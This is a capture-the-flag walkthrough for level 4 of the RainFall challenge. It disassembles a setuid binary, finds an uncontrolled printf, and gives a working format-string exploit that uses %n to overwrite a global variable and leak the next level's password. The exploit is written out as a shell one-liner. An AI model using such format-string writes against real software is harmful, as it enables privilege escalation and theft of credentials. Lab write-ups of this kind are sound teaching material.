# Level4

As in level3, we can find an executable waiting for an input, print it and quit after press enter
```
level4@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
level4@RainFall:~$ ./level4
bla
bla
level4@RainFall:~$
```
After analyze it with radare2 (please refer to [level1](https://github.com/maxisimo/42-RainFall/blob/main/level1/walkthrough.md) if you want more details on the steps to follow)  
We can see that the `main()` function call a function named `n()` who also call a function named `p()`.  
- main() :
```
[0x08048390]> s main
[0x080484a7]> pdda
    ; assembly                               | /* r2dec pseudo code output */
                                             | /* level4 @ 0x80484a7 */
                                             | #include <stdint.h>     
                                             |
    ; (fcn) main ()                          | int32_t main (void) {   
    0x080484a7 push ebp                      |
    0x080484a8 mov ebp, esp                  |
    0x080484aa and esp, 0xfffffff0           |
    0x080484ad call 0x8048457                |     n ();
    0x080484b2 leave                         |
    0x080484b3 ret                           |
                                             | }
[0x080484a7]>
```
- n() :
```
[0x080484a7]> s sym.n
[0x08048457]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level4 @ 0x8048457 */
                                                 | #include <stdint.h>
                                                 |  
    ; (fcn) sym.n ()                             | int32_t n (void) {
                                                 |     char * s;
                                                 |     int32_t size;
                                                 |     FILE * stream;
    0x08048457 push ebp                          |
    0x08048458 mov ebp, esp                      |     
    0x0804845a sub esp, 0x218                    |
    0x08048460 mov eax, dword [0x8049804]        |     eax = stdin;
    0x08048465 mov dword [esp + 8], eax          |     *((esp + 8)) = eax;
    0x08048469 mov dword [esp + 4], 0x200        |     *((esp + 4)) = 0x200;
    0x08048471 lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x08048477 mov dword [esp], eax              |
    0x0804847a call 0x8048350                    |     fgets (ebp);
    0x0804847f lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x08048485 mov dword [esp], eax              |
    0x08048488 call 0x8048444                    |     p (eax);
    0x0804848d mov eax, dword [0x8049810]        |     eax = *(obj.m);
    0x08048492 cmp eax, 0x1025544                |
                                                 |     if (eax == 0x1025544) {
    0x08048497 jne 0x80484a5                     |
    0x08048499 mov dword [esp], 0x8048590        |
    0x080484a0 call 0x8048360                    |         system ("/bin/cat /home/user/level5/.pass");
                                                 |     }
    0x080484a5 leave                             |
    0x080484a6 ret                               |     return eax;
                                                 | }
[0x08048457]>
```
- p() :
```
[0x08048457]> s sym.p
[0x08048444]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level4 @ 0x8048444 */
                                                 | #include <stdint.h>
                                                 |  
    ; (fcn) sym.p ()                             | int32_t p (char * format) {
    0x08048444 push ebp                          |
    0x08048445 mov ebp, esp                      |
    0x08048447 sub esp, 0x18                     |
    0x0804844a mov eax, dword [ebp + 8]          |     eax = *((ebp + 8));
    0x0804844d mov dword [esp], eax              |
    0x08048450 call 0x8048340                    |     printf (eax);
    0x08048455 leave                             |
    0x08048456 ret                               |     return eax;
                                                 | }
[0x08048444]>
```
The `main()` only call `n()`, not very interesting so we can skip it.  
We can see a call to `fgets()`, in `n()`, wich is protect against buffer overflow attack.
```
    0x0804847a call 0x8048350                    |     fgets (ebp);
```
After that we can see a call to `printf()` function, in `p()` wich is vulnerable to format string exploit!
```
    0x08048450 call 0x8048340                    |     printf (eax);
```
Then the program compares the value of a global variable `m` at `0x8049810` to 0x1025544 (16930116 in dec).  
If the comparaison return true then the function will launch a shell via a call to `system()`.  
We need to manipulate `printf()` function into changing the value of the variable at the address `0x8049810`.   
First, as in [level2](https://github.com/maxisimo/42-RainFall/blob/main/level2/walkthrough.md) we need to print the memory until we reach the address of the variable we wish to modify, then change the content of the variable `m`.
```
level4@RainFall:~$ python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4
aaaa b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0
level4@RainFall:~$ python -c 'print "aaaa" + " %x" * 15' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4
aaaa b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
level4@RainFall:~$
```
The buffer `aaaa` is at the 12th position (`61616161`) !  
The previous method can't work, cause the value `16930116` in the comparaison is too long. But with the modifier `%d`, we can dynamically specify the field width (like that : `%16930116d`).  
This will be the only difference between this level and the older one.  
Finally our final format string attack will look like :  
- address of `m` (4 bytes)
- pad of 16930112 (sub 4 bytes cause of `m`) with modifier `%d` + modifier `%n`
```
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4
                                                                                     -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
level4@RainFall:~$ su level5
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
level5@RainFall:~$
```
*For this level we didn't have to keep listening `stdin` cause the `system()` function made a "/bin/cat /home/user/level5/.pass"*
Level4 passed!
